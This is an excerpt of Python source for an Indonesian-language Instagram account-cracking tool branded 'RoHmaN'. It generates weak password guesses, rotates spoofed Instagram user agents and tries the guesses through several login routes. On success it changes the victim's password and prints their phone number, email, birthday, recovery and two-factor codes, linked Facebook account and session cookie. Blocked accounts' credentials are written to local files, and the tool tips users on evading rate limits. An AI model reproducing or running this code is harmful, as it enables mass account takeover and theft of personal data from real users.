...
class MAIN:
   ...
   def MyRich(self, Text, chos=None):
       ...
       if chos:
          Console(width=73).print(Nel(Text,subtitle=f'[blue]┌─',subtitle_align='left',\
          style=self.cat))
       else:
          Console(width=73).print(Nel(Text, \
          style=self.cat))
                   ...
                   try:
                       ...
                       for self.r in self.b:
                           if len(self.r) <3:continue
                              ...
                              self.x.append(self.r.lower() + '1234567')
...
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -',True)
   ...
   def Fafo(self, cokie):
       ...
       self.aku = '%s%s|%s'%(self.User, self.nama)
       return(self.aku)
   ...
   def AppUac(self, GoblokLu=None):
       self.Dpi  = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540','320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
       ...
       self.Andr = random.choice(['28/9','29/10','30/11','31/12','33/13','23/6.0.1'])
       self.apkv = f'{random.randint(100,500)}.{random.randint(1,10)}.0.{random.randint(20,35)}.{random.randint(90,120)}'
       self.ua1 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; OPPO; PEPM00; OP4ECB; qcom; in_ID; {self.kode})'
       self.ua2 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; samsung; SM-A035M; a03; ums9230_25c10; pt_BR; {self.kode})'
       self.ua3 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Xiaomi; Redmi 4; markw; qcom; ru_RU; {self.kode})'
#       self.ua = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; realme; RMX3782; RE5C6CL1; mt6835; in_ID; {self.kode})'
...
#       self.ua4 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; HTC/htc; HTC Desire 616 dual sim; htc_v3_dug; mt6592; in_iD)'
   ...
   def HeadersApiLogin(self):
       return {
          ...
          'priority': 'u=3',
          'user-agent': 'Mozilla/5.0 (Linux; Android 14; SM-G990U3 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.100 Mobile Safari/537.36 Instagram 354.2.0.47.100 Android (34/14; 480dpi; 1080x2097; samsung; SM-G990U3; r9q; qcom; en_US; 655395738)',
   ...
   def ApiRecovery(self,users, password):
       with requests.Session() as Client:
         try:
             for pwb in password:
                 ...
                 if 'logged_in_user' in self.Respons.text.replace('\\',''):
                    ...
                    if True in self.UbahData:
                       ...
                       statusok = f'[bold white]methode >>> [bold green]Instagram Recovery\n[bold white]username >>> [bold green]{info_username}\n[bold white]password >>> [bold green]{self.PWX}\n[bold white]nomor hp >>> [bold green]{info_nomor_hp}\n[bold white]email >>> [bold green]{info_email}\n[bold white]birthday >>> [bold green]{info_birthday}\n[bold white]status a2f >>> [bold green]{self.cex}\n[bold white]authentikasi >>> [bold green]{self.aut}\n[bold white]pemulihan >>> [bold green]{self.pem}\n[bold white]profile data >>> [bold green]{info_followers}/{info_following}\n[bold white]Facebook acc >>> [bold green]{akunfb}\n[bold white]cookie >>> [bold green]{cookie}'
                       statusok9 = nel(statusok, width=73,subtitle=f'[blue]┌─',subtitle_align='left', style='bold blue', title='[bold green]<[ RoHmaN - OK ]>[bold blue]')
                       cetak(statusok9)
                    else:
                       statusok = f'[bold white]methode >>> [bold green]Instagram Recovery\n[bold white]username >>> [bold green]{info_username}\n[bold white]password >>> [bold green]{pwb}\n[bold white]nomor hp >>> [bold green]{info_nomor_hp}\n[bold white]email >>> [bold green]{info_email}\n[bold white]birthday >>> [bold green]{info_birthday}\n[bold white]profile data >>> [bold green]{info_followers}/{info_following}\n[bold white]Facebook acc >>> [bold green]{akunfb}\n[bold white]cookie >>> [bold green]{cookie}'
                       statusok9 = nel(statusok, width=73,subtitle=f'[blue]┌─',subtitle_align='left', style='bold blue', title='[bold green]<[ RoHmaN - OK ]>[bold blue]')
                       cetak(statusok9)
                       self.aut = None
                       self.pem = None
                    ...
                    statuscp = f'[bold white]methode >>> [bold yellow]Instagram Recovery\n[bold white]username >>> [bold yellow]{users}\n[bold white]password >>> [bold yellow]{pwb}\n[bold white]data profile >>> [bold yellow]{followers}/{following}/{postingan}'
                    statuscp1 = nel(statuscp, width=73,subtitle=f'[yellow]┌─',subtitle_align='left', style='bold yellow', title='[bold white]<[ RoHmaN - CP ]>[bold green]')
                    cetak(statuscp1)
             ...
             self.Loop +=1                                      
             _status = '200'
             Console(style=temane[0]).print(f'   └──[ RoHmaN ] ModPes {_status} Idz OK -: {self.ResultSuccess} CP -: {self.ResultChechpoint} Idz ke -: {self.Loop} ]',end='\r')
           ...
           for pwb in password:
               ...
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    ...
                    if True in self.UbahData:
                       ...
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       statusok = f'[bold white]methode >>> [bold green]Threads\n[bold white]username >>> [bold green]{info_username}\n[bold white]password >>> [bold green]{self.PWX}\n[bold white]nomor hp >>> [bold green]{info_nomor_hp}\n[bold white]email >>> [bold green]{info_email}\n[bold white]birthday >>> [bold green]{info_birthday}\n[bold white]status a2f >>> [bold green]{self.cex}\n[bold white]authentikasi >>> [bold green]{self.aut}\n[bold white]pemulihan >>> [bold green]{self.pem}\n[bold white]profile data >>> [bold green]{info_followers}/{info_following}\n[bold white]Facebook acc >>> [bold green]{akunfb}\n[bold white]cookie >>> [bold green]{cookie}'
                       statusok9 = nel(statusok, width=73,subtitle=f'[blue]┌─',subtitle_align='left', style='bold blue', title='[bold green]<[ RoHmaN - OK ]>[bold blue]')
                       cetak(statusok9)
                    ...
                    followers, following, postingan = self.friends_user_chek(users)
                    statuscp = f'[bold white]methode >>> [bold yellow]Threads\n[bold white]username >>> [bold yellow]{users}\n[bold white]password >>> [bold yellow]{pwb}\n[bold white]data profile >>> [bold yellow]{followers}/{following}/{postingan}'
                    statuscp1 = nel(statuscp, width=73,subtitle=f'[yellow]┌─',subtitle_align='left', style='bold yellow', title='[bold white]<[ RoHmaN - CP ]>[bold green]')
                    cetak(statuscp1)
             ...
             for pwb in password:
                 ...
                 if 'logged_in_user' in self.responsIG.text.replace('\\',''):
                    ...
                    if True in self.UbahData:
                       ...
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       statusok = f'[bold white]methode >>> [bold green]Instagram Manual\n[bold white]username >>> [bold green]{info_username}\n[bold white]password >>> [bold green]{self.PWX}\n[bold white]nomor hp >>> [bold green]{info_nomor_hp}\n[bold white]email >>> [bold green]{info_email}\n[bold white]birthday >>> [bold green]{info_birthday}\n[bold white]status a2f >>> [bold green]{self.cex}\n[bold white]authentikasi >>> [bold green]{self.aut}\n[bold white]pemulihan >>> [bold green]{self.pem}\n[bold white]profile data >>> [bold green]{info_followers}/{info_following}\n[bold white]Facebook acc >>> [bold green]{akunfb}\n[bold white]cookie >>> [bold green]{cookie}'
                       statusok9 = nel(statusok, width=73,subtitle=f'[blue]┌─',subtitle_align='left', style='bold blue', title='[bold green]<[ RoHmaN - OK ]>[bold blue]')
                       cetak(statusok9)
                    else:
                       statusok = f'[bold white]methode >>> [bold green]Instagram Manual\n[bold white]username >>> [bold green]{info_username}\n[bold white]password >>> [bold green]{pwb}\n[bold white]nomor hp >>> [bold green]{info_nomor_hp}\n[bold white]email >>> [bold green]{info_email}\n[bold white]birthday >>> [bold green]{info_birthday}\n[bold white]profile data >>> [bold green]{info_followers}/{info_following}\n[bold white]Facebook acc >>> [bold green]{akunfb}\n[bold white]cookie >>> [bold green]{cookie}'
                    ...
                    followers, following, postingan = self.friends_user_chek(users)
                    statuscp = f'[bold white]methode >>> [bold yellow]Instagram Manual\n[bold white]username >>> [bold yellow]{users}\n[bold white]password >>> [bold yellow]{pwb}\n[bold white]data profile >>> [bold yellow]{followers}/{following}/{postingan}'
                    statuscp1 = nel(statuscp, width=73,subtitle=f'[yellow]┌─',subtitle_align='left',style='bold yellow', title='[bold white]<[ RoHmaN - CP ]>[bold green]')
                    cetak(statuscp1)
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
           ...
           for pwb in password:
               ...
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    ...
                    if True in self.UbahData:
                       ...
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       statusok = f'[bold white]methode >>> [bold green]SmartLock\n[bold white]username >>> [bold green]{info_username}\n[bold white]password >>> [bold green]{self.PWX}\n[bold white]nomor hp >>> [bold green]{info_nomor_hp}\n[bold white]email >>> [bold green]{info_email}\n[bold white]birthday >>> [bold green]{info_birthday}\n[bold white]status a2f >>> [bold green]{self.cex}\n[bold white]authentikasi >>> [bold green]{self.aut}\n[bold white]pemulihan >>> [bold green]{self.pem}\n[bold white]profile data >>> [bold green]{info_followers}/{info_following}\n[bold white]Facebook acc >>> [bold green]{akunfb}\n[bold white]cookie >>> [bold green]{cookie}'
                       statusok9 = nel(statusok, width=73,subtitle=f'[blue]┌─',subtitle_align='left', style='bold blue', title='[bold green]<[ RoHmaN - OK ]>[bold blue]')
                       cetak(statusok9)
                    else:
                       statusok = f'[bold white]methode >>> [bold green]SmartLock\n[bold white]username >>> [bold green]{info_username}\n[bold white]password >>> [bold green]{pwb}\n[bold white]nomor hp >>> [bold green]{info_nomor_hp}\n[bold white]email >>> [bold green]{info_email}\n[bold white]birthday >>> [bold green]{info_birthday}\n[bold white]profile data >>> [bold green]{info_followers}/{info_following}\n[bold white]Facebook acc >>> [bold green]{akunfb}\n[bold white]cookie >>> [bold green]{cookie}'
                    ...
                    followers, following, postingan = self.friends_user_chek(users)
                    statuscp = f'[bold white]methode >>> [bold yellow]SmartLock\n[bold white]username >>> [bold yellow]{users}\n[bold white]password >>> [bold yellow]{pwb}\n[bold white]data profile >>> [bold yellow]{followers}/{following}/{postingan}'
                    statuscp1 = nel(statuscp, width=73,subtitle=f'[yellow]┌─',subtitle_align='left', style='bold yellow', title='[bold white]<[ RoHmaN - CP ]>[bold green]')
                    cetak(statuscp1)
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
